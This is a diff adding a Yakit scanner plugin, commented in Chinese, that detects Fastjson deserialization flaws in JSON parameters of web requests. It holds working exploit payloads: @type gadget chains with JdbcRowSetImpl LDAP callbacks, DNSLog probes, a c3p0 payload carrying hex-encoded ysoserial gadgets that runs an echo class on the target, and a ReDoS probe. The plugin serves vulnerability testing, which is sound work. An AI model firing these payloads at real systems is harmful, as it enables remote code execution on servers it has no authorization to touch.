@@ -1,0 +1,477 @@
+// 插件配置
+dnslogTimeout = 3
+timeoutTolerance = 2 // 2 秒的超时容错
+fuzzTimeout = 10
+networkFluctuation = 5 // 网络波动，fuzztimeout = networkFluctuation * getCommonWastTime()
+log.setLevel("debug")
+
+encodePayload = payload=>{
+    res = re.FindAll(payload, `"(.*?)"`)
+    for i in res{
+        payload = payload.Replace(i, `"%v"`%codec.UnicodeEncode(i[1:-1]))
+    }
+    return payload
+}
+
+logIsFastjsonInfo = b =>{
+    info = "不支持的fastjson flag"
+    switch b{
+        case 0:
+            info = "无法判断目标 json 框架类型"
+        case 1:
+            info = "目标疑似使用 fastjson 框架"
+        case -1:
+            info = "目标疑似使用 jaskon 框架"
+    }
+    yakit.Info(info)
+}
+
+logVersionScope = scope =>{
+    if len(scope) == 0{
+        yakit.Info("目标json框架版本检测失败")
+        return
+    }
+    if scope[0] == scope[1]{
+        yakit.Info("目标json框架版本是 [%s]" % scope[0])
+    }else{
+        yakit.Info("目标json框架版本范围是 [%s - %s]" % scope)
+    }
+}
+
+versionCompare = (s1,s2)=>{ //版本比较，只适用类似这种的版本号比较：1.1.1
+    v1 = str.Split(s1,".")
+    v2 = str.Split(s2,".")
+    if len(v1) == 3 && len(v2) == 3{
+        vc = (a,b)=>{return a > b ? 1 : (a == b ? 0 : -1)}
+        for i in 3{
+            vcr = vc(int(v1[i]),int(v2[i]))
+            if vcr != 0{
+                return vcr,true
+            }
+        }
+    }else{
+        return 0,false
+    }
+    return 0,true
+}
+versionInScope = (scope1,scope2)=>{ // 判断 scope2 和 scope1 是否有交集
+    if len(scope1) != 2 || len(scope2) != 2{
+        return false
+    }
+    inScope = v=>{
+        res,ok = versionCompare(scope1[0],v)
+        if ok && res == 1{ // scope1[0] > v
+            return false
+        }
+        res,ok = versionCompare(scope1[1],v)
+        if ok && res == -1{ // scope1[1] < v
+            return false
+        }
+        return true
+    }
+    return inScope(scope2[0]) || inScope(scope2[0])
+}
+solution = `1. 升级Fastjson版本：如果你的项目中使用了Fastjson，请确保使用的是1.2.80版本或以上。Fastjson团队已经在1.2.80版本中修复了反序列化漏洞以及其他安全问题，因此升级到较新版本是解决漏洞的最佳方法。
+
+2. 避免使用AutoType特性：Fastjson的AutoType功能是导致反序列化漏洞的一个重要因素。该功能可以在一定程度上增强反序列化能力，但也容易被恶意利用。在实际使用中，尽量避免开启AutoType功能，可以通过设置ParserConfig的autoTypeSupport属性为false来关闭该功能。这样做会限制某些复杂类型的反序列化能力，但可以提高安全性。
+
+3. 审查输入数据：在处理JSON字符串时，对于从不可信来源（如网络、用户输入等）获取的数据，应进行充分的验证和过滤。确保只有受信任的数据被传递给Fastjson进行反序列化操作。`
+description = `Fastjson反序列化漏洞是一种远程代码执行漏洞，攻击者可以通过构造恶意JSON字符串触发漏洞，进而执行任意代码。该漏洞存在的原因是Fastjson在处理某些特定的JSON字符串时没有正确地检查反序列化的数据，导致攻击者可以在JSON中植入恶意代码。`
+
+// json为空时会误判
+isJson = d =>{return len(json.loads(d)) > 0}
+getBody = rsp =>{return str.SplitHTTPHeadersAndBodyFromPacket(rsp)[1] }
+dnslogPocs = [`{"@type":"java.net.Inet4Address","val":"{{params(dnslog)}}"}`,`{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(dnslog)}}"}`]
+
+outNetExps = []
+
+expMap = {
+    "exp_1283":[`[{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog1)}}"}}},{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog2)}}"}}}]`],
+    "exp_1243":[`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`],
+    "exp_1268":[`[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "{{params(dnslog)}}"}}]`],
+    "exp_c3p0":[`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"{{randstr(2)}}":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:{{params(payload)}};"}}`]
+}
+poc_redos = `{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaa!"}`
+# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
+mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    originReq = req
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+    firstBody = body
+    globalInfo = sync.NewMap()
+    defer fn{
+        e = recover()
+        if e{
+            yakit.Error("plugin run error: %v", e)
+        }
+        v,ok = globalInfo.Load("risk")
+        if ok {
+            v.createRisk()
+        }
+    }
+    getCommonWastTime = ()=>{
+        v,ok = globalInfo.Load("wastTimes")
+        if !ok{
+            return -1 // 当获取commonTime失败时不进行超时检查
+        }else{
+            i = 0
+            for t in v{
+                i+=t
+            }
+            return i/len(v)
+        }
+    }
+    newRisk = (title,payload,param,levelIndex)=>{
+        yakit.Info("发现漏洞风险: %v", title)
+        log.debug("response: %v", string(param.rsp.RequestRaw))
+        globalInfo.Store("isFastjson",1)
+        titleVerbose = title
+        version,ok=globalInfo.Load("versionScope")
+        if ok && (version[0] != "0.0.0" || version[1] != "999.999.999"){
+            title += " 版本 [%v-%v]"%version
+        }
+        v,ok=globalInfo.Load("risk")
+        levelFlag = ["low","middle","critical"]
+        rsp = param.rsp
+        RequestRaw = rsp.RequestRaw
+        ResponseRaw =rsp.ResponseRaw
+        name = param.param.name
+        if !ok || levelIndex >= v.level { // 当风险等级大于等于上一个risk时更新risk
+            globalInfo.Store("risk",{"level":levelIndex,"createRisk":()=>{
+                risk.NewRisk(url,
+                    risk.title(title),
+                    // risk.titleVerbose(titleVerbose),
+                    risk.parameter(name),
+                    risk.level(levelFlag[levelIndex]),
+                    risk.request(RequestRaw),
+                    risk.response(ResponseRaw),
+                    risk.payload(payload),
+                    risk.description(description),
+                    risk.solution(solution),
+                    risk.details({"durationS":rsp.DurationMs/1000.0})
+                )
+            }})
+        }
+    }
+    isFastjson = (fuzzParam)=>{
+        paramInfo = fuzzParam.param
+        isFastjsonParam = 0
+        if isJson(paramInfo.value){ // 当响应包为json时尝试通过添加字段判断jackson
+            hasError = s =>{
+                log.debug("检查body错误值: %v", s)
+                return re.Match("false|500|error", s)
+            }
+            commonHasError = hasError(paramInfo.value)
+            data = json.loads(paramInfo.value)
+            data[randstr(5)] = randstr(5)
+            dataStr = json.dumps(data)
+            log.debug("fastjson payload: %v", dataStr)
+            rsp,err = fuzzParam.fuzz(dataStr)
+            if err {
+                yakit.Error("发送 request error: %v", err)
+                return
+            }
+            body = getBody(rsp.ResponseRaw)
+            if !(!commonHasError && hasError(string(body)) || string(body) != paramInfo.value) { // 由于添加字段导致出现错误或和原本响应包内容发生不同则判断为jackson
+                isFastjsonParam = -1
+                return
+            }
+        }
+        globalInfo.Store("isFastjson",isFastjsonParam)
+        return isFastjsonParam
+    }
+    checkFastjsonVersion = param =>{
+        scope = ["0.0.0","999.999.999"]
+        rsp,err = param.fuzz(`{"@type":"java.lang.AutoCloseable"`)
+        if err != nil{
+            return nil
+        }
+        version = re.Grok(string(rsp.ResponseRaw), `fastjson-version %{COMMONVERSION:version}`)["version"]
+        if version{
+            if len(version) > 0{
+                version = version[0]
+                scope = [version,version]
+                globalInfo.Store("isFastjson",1)
+                newRisk("目标存在 fastjson 框架 (Version Check)","",param,0)
+            }
+        }
+        globalInfo.Store("versionScope",scope)
+        return scope
+    }
+    hasCriticalRisk = ()=>{
+        v,ok = globalInfo.Load("risk")
+        if ok && v.level == 2{
+            return true
+        }
+        return false
+    }
+    checkPayloadsByVersionScope = (param)=>{
+        versionScope,ok = globalInfo.Load("versionScope")
+        if len(versionScope) != 2{
+            versionScope = ["0.0.0","999.999.999"]
+        }
+        if ok && versionScope !=nil && len(versionScope) == 2{
+            exps = []
+            v = "1.2.43"
+            res,ok = versionCompare(versionScope[1],v)
+            if ok {
+                if res != 1{ // versionScope[1] <= v
+                    varName = "exp_"+str.Join(str.Split(v,"."), "")
+                    log.debug("添加payload: %v", varName)
+                    exps.Append(expMap.$varName)
+                }else{ // versionScope[1] > v
+                    exps.Append(expMap.exp_1268)
+                    exps.Append(expMap.exp_1283)
+                    log.debug("添加payload: exp_1268")
+                    log.debug("添加payload: exp_1283")
+                }
+            }
+
+            if len(exps)>0{
+                checkDns = true
+                domain,token,err = risk.NewDNSLogDomain()
+                if err{ // 如果获取dnslog失败则尝试使用错误的地址延迟测试
+                    yakit.Error("生成 dnslog error: %v", err)
+                    checkDns = false
+                    domain = "123.123.123.123"
+                }
+                dnslog1Prefix = randstr(5)
+                dnslog2Prefix = randstr(5)
+                for exp in exps{
+                    exp = fuzz.StringsWithParam(exp,{"reverseConnTarget":"ldap://%v"%domain,"dnslog":domain,"dnslog1":"%v.%s"%[dnslog1Prefix,domain],"dnslog2":"%v.%s"%[dnslog2Prefix,domain]})
+                    if len(exp) == 0{
+                        continue
+                    }
+                    exp = exp[0]
+                    rsp,err = param.delayFuzz(exp)
+                    wastTime = rsp.DurationMs/1000.0
+                    if checkDns{
+                        res,err = risk.CheckDNSLogByToken(token,dnslogTimeout)
+                        if err{
+                            // dnslog查询失败
+                        }else{
+                            if len(res) > 0{ // dnslog查询检测成功
+                                globalInfo.Store("outNet",1)
+                                for info in res{
+                                    if str.HasPrefix(str.ToLower(info["Domain"]),str.ToLower(dnslog1Prefix)){
+                                        globalInfo.Store("versionScope",["1.2.80","1.2.80"])
+                                    }
+                                    if str.HasPrefix(str.ToLower(info["Domain"]),str.ToLower(dnslog2Prefix)){
+                                        globalInfo.Store("versionScope",["1.2.83","1.2.83"])
+                                    }
+                                }
+                                newRisk("目标 fastjson 框架可能存在 RCE 漏洞 (DNSLog Check)",exp,param,2)
+                                break
+                            }
+                        }
+                    }
+                    log.debug("当前请求时长: %v", wastTime)
+                    log.debug("常规请求时长: %v", getCommonWastTime())
+                    log.debug("当前超时容错值: %v", timeoutTolerance)
+                    if wastTime - getCommonWastTime() > timeoutTolerance{ // 如果dnslog查询失败会进行延时检测
+                        newRisk("目标 fastjson 框架可能存在 RCE 漏洞 (Delay Check)",exp,param,2)
+                        break
+                    }
+                }
+            }
+        }
+    }
+
+    needToFuzzParams = [] // (payload) => freq
+    reqIsJson = str.MatchAllOfRegexp(string(req), `(?i)Content-Type: (.*?)json`)
+    rspIsJson = str.MatchAllOfRegexp(string(rsp), `(?i)Content-Type: (.*?)json`)
+    if reqIsJson{
+        log.debug("请求包body存在json")
+    }
+    if rspIsJson{
+        log.debug("响应包body存在json")
+    }
+    if !reqIsJson && !rspIsJson { // 请求包或响应包的Content-Type不包含json则检查queryParam、cookieParam、postParam中的json
+        allParams = freq.GetPostParams()
+        allParams.Append(freq.GetGetQueryParams()...)
+        allParams.Append(freq.GetCookieParams()...)
+        for param in allParams{
+            if isJson(param.Value()){
+                p = param
+                needToFuzzParams.Append({"value":p.Value(),"fuzz":(payload)=>{
+                    return p.Fuzz(payload)
+                },"name":p.name()})
+            }
+        }
+    }else{ // fuzz body
+        if reqIsJson{
+            body = getBody(req)
+            res = {"value":string(body),"fuzz":(payload)=>{
+                return freq.FuzzPostRaw(payload)
+            },"name":"[body]","isBody":true}
+            needToFuzzParams.Append(res)
+        }
+    }
+    for i = 0; i < len(needToFuzzParams); i++{
+        param = needToFuzzParams[i]
+        newParam = {"param":param,"isBody":param["isBody"]}
+        delayFuzz = payload=>{
+            payload = encodePayload(payload)
+            rsp,err = param.fuzz(payload).ExecFirst(fuzz.WithTimeOut(fuzzTimeout))
+            if err == nil{
+                if str.Contains(string(rsp.ResponseRaw),"autoType is not support"){
+                    globalInfo.Store("isFastjson",1)
+                }
+            }
+            newParam["rsp"] = rsp
+            return rsp,err
+        }
+        newParam["delayFuzz"] = delayFuzz
+        newParam["fuzz"] = payload=>{ // 每次常规请求会计入平均请求时长
+            rsp,err = delayFuzz(payload)
+            wastTime = rsp.DurationMs/1000.0
+            v,ok = globalInfo.Load("wastTimes")
+            commonWastTime = getCommonWastTime()
+            if commonWastTime != -1{ // 调整网络波动，根据网络波动可以计算出超时时长
+                wastTimeRound = math.Round(wastTime) // 以秒为单位，减小误差
+                commonWastTimeRound = math.Round(commonWastTime)
+                if !(wastTimeRound == 0 || commonWastTimeRound == 0){ // 超过1秒才有调整的必要
+                    networkFluctuation_bak = networkFluctuation
+                    tt = len(v)/10.0 // 调整系数，统计次数越多，系数越大，最大为1
+                    if tt > 1{
+                        tt = 1
+                    }
+                    fluctuation = math.Abs(wastTimeRound-commonWastTimeRound)*1.0/commonWastTimeRound
+                    fluctuation = math.Ceil(fluctuation)
+                    networkFluctuation = networkFluctuation - (networkFluctuation - fluctuation)*tt // 每次调整幅度要乘以调整系数
+                    log.debug("调整网络波动: `%f` -> `%f`" %[networkFluctuation_bak,networkFluctuation])
+                }
+            }
+            if !ok{
+                v = [wastTime]
+            }else{
+                v = append(v,wastTime)
+            }
+            if getCommonWastTime() != -1{
+                fuzzTimeout = math.Ceil(getCommonWastTime()) * networkFluctuation // 根据网络波动调整超时时间
+            }
+            globalInfo.Store("wastTimes",v)
+            return rsp,err
+        }
+        needToFuzzParams[i] = newParam
+    }
+
+    if len(needToFuzzParams) == 0{
+        return
+    }
+    fuzzParam = needToFuzzParams[0]
+
+    // 报错检测
+    fastjsonCheck = isFastjson(fuzzParam)
+    logIsFastjsonInfo(fastjsonCheck)
+    if fastjsonCheck != -1{ // 不是jackson框架就继续检测
+        log.debug("目标使用非jackson框架")
+        versionScope = checkFastjsonVersion(fuzzParam)
+        logVersionScope(versionScope)
+        log.debug("开始EXP检测")
+        for param in needToFuzzParams{
+            checkPayloadsByVersionScope(param) // 根据版本fuzz
+            if hasCriticalRisk(){
+                break
+            }
+        }
+        // 上一个步骤已经可以得知出网信息、常规请求时长信息
+        // 反连检测（这个步骤可以获取比较准确的出网情况）
+        v, ok = globalInfo.Load("isFastjson")
+        if (!ok || ok && v!=1) && !hasCriticalRisk(){
+            log.debug("开始出网检测")
+            for param in needToFuzzParams{
+                for poc in dnslogPocs{
+                    domain,token,err = risk.NewDNSLogDomain()
+                    if err{
+                        continue
+                    }
+                    poc = fuzz.StringsWithParam(poc, {"dnslog":domain})
+                    if len(poc) != 1{
+                        continue
+                    }
+                    rsp,err = param.delayFuzz(poc[0])
+                    if err{
+                        continue
+                    }
+                    res,err = risk.CheckDNSLogByToken(token, dnslogTimeout)
+                    if err{
+                        continue
+                    }
+                    if len(res)>0{
+                        globalInfo.Store("outNet",1)
+                        newRisk("目标 fastjson 框架存在 dnslog 回显",poc,param,0)
+                        break
+                    }
+                    wastTime = rsp.DurationMs/1000.0
+                    if wastTime - getCommonWastTime() > timeoutTolerance{ // 如果dnslog查询失败会进行延时检测
+                        newRisk("目标 fastjson 框架可能存在漏洞 (Delay Check)",poc,param,0)
+                        break
+                    }
+                }
+            }
+        }
+
+        /*
+            下一个不出网检测需要爆破利用链，payload较多，这里再确认下目标是fastjson，不能确认就结束检测
+        */
+        // fastjson特征检测（dos延时、读文件等操作）
+        if !hasCriticalRisk() && globalInfo.Load("isFastjson")[0] != 1{
+            log.debug("开始fastjson特征检测")
+            for param in needToFuzzParams{
+                // redos 检测 适用于 1.2.36 - 1.2.62
+                scope,ok = globalInfo.Load("versionScope")
+                if ok && versionInScope(scope,["1.2.36","1.2.6"]) {
+                    log.debug("redos 特征检测")
+                    rsp,err = param.delayFuzz(poc_redos)
+                    if rsp.DurationMs/1000.0 > getCommonWastTime() {
+                        newRisk("目标存在 fastjson 框架 (Redos Check)","",param,0)
+                        break
+                    }
+                }
+
+            }
+        }
+
+        // 不出网检测 （这里发包会比较多，需要确保目标是fastjson）
+        v,ok = globalInfo.Load("outNet")
+        isFastjson,ok = globalInfo.Load("isFastjson")
+        if (!ok || ok && v != 1) && !hasCriticalRisk() && isFastjson == 1 {
+            log.debug("开始回显检测")
+            key = randstr(5)
+            val = randstr(5)
+            gadgets = yso.GetAllTemplatesGadget()
+            for gadgetGen in gadgets{
+                gadget,err = gadgetGen(yso.useHeaderEchoEvilClass(),yso.springHeader(key,val))
+                if err{
+                    yakit.Error("生成 header echo payload error: %v", err)
+                }
+                byts = yso.ToBytes(gadget)~
+                payload = codec.EncodeToHex(byts)~
+                payload = str.ToUpper(payload)
+                payload = fuzz.StringsWithParam(expMap.exp_c3p0, {"payload":payload})
+                if len(payload) > 0{
+                    payload = payload[0]
+                }
+                for param in needToFuzzParams{
+                    if param["isBody"] != true{
+                        continue
+                    }
+                    originReq = poc.DeleteHTTPPacketHeader(originReq, "Accept-Language")
+                    req = poc.AppendHTTPPacketHeader(originReq, "Accept-Language","zh-CN,zh;q=1.9")
+                    freq,err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
+                    if err != nil{
+                        yakit.Error("生成 fuzz request 错误: %v", err)
+                    }
+                    rsp,err = freq.FuzzPostRaw(payload).ExecFirst()
+                    if err != nil{
+                        continue
+                    }
+                    if poc.GetHTTPPacketHeader(rsp.ResponseRaw, key) == val{
+                        newRisk("目标 fastjson 框架存在 RCE 漏洞, 成功执行回显代码",payload,param,2)
+                    }
+                }
+            }
+        }
+    }
+}
+
